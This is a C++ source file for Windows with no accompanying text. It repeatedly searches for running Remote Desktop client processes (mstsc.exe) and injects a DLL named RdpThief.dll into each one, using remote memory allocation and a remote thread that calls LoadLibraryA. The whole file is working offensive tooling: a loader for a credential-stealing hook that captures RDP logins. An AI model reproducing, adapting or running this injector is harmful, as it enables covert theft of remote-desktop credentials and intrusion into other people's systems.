#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <vector>

std::vector<DWORD> FindProcessIds(const std::string& processName) {
    std::vector<DWORD> pids;
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);

    HANDLE processesSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE) {
        return pids;
    }

    if (Process32First(processesSnapshot, &processInfo)) {
        do {
            if (!processName.compare(processInfo.szExeFile)) {
                pids.push_back(processInfo.th32ProcessID);
            }
        } while (Process32Next(processesSnapshot, &processInfo));
    }

    CloseHandle(processesSnapshot);
    return pids;
}

BOOL InjectDLL(const DWORD& processId, const char* dllPath) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (hProcess == NULL) {
        std::cout << "Failed to open target process." << std::endl;
        return FALSE;
    }

    LPVOID pDllPath = VirtualAllocEx(hProcess, 0, strlen(dllPath) + 1, MEM_COMMIT, PAGE_READWRITE);
    if (pDllPath == NULL) {
        std::cout << "Failed to allocate memory in target process." << std::endl;
        CloseHandle(hProcess);
        return FALSE;
    }

    if (!WriteProcessMemory(hProcess, pDllPath, (LPVOID)dllPath, strlen(dllPath) + 1, NULL)) {
        std::cout << "Failed to write DLL path to target process memory." << std::endl;
        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    LPVOID pLoadLibraryA = (LPVOID)GetProcAddress(GetModuleHandleA("kernel32.dll"), "LoadLibraryA");
    if (pLoadLibraryA == NULL) {
        std::cout << "Failed to locate LoadLibraryA." << std::endl;
        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pLoadLibraryA, pDllPath, 0, NULL);
    if (hThread == NULL) {
        std::cout << "Failed to create remote thread in target process." << std::endl;
        VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return FALSE;
    }

    WaitForSingleObject(hThread, INFINITE);

    CloseHandle(hThread);
    VirtualFreeEx(hProcess, pDllPath, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    return TRUE;
}

int main() {
    const char* dllPath = "C:\\RdpThief.dll"; 
    const std::string targetProcess = "mstsc.exe";

    while (true) {
        std::vector<DWORD> pids = FindProcessIds(targetProcess);

        for (DWORD pid : pids) {
            if (InjectDLL(pid, dllPath)) {
                std::cout << "DLL injected successfully into PID: " << pid << std::endl;
            } else {
                std::cout << "DLL injection failed for PID: " << pid << std::endl;
            }
        }

        if (pids.empty()) {
            std::cout << "Target process not found. Retrying..." << std::endl;
        }

        Sleep(5000); // Esperar 5 segundos antes de intentarlo de nuevo
    }

    return 0;
}
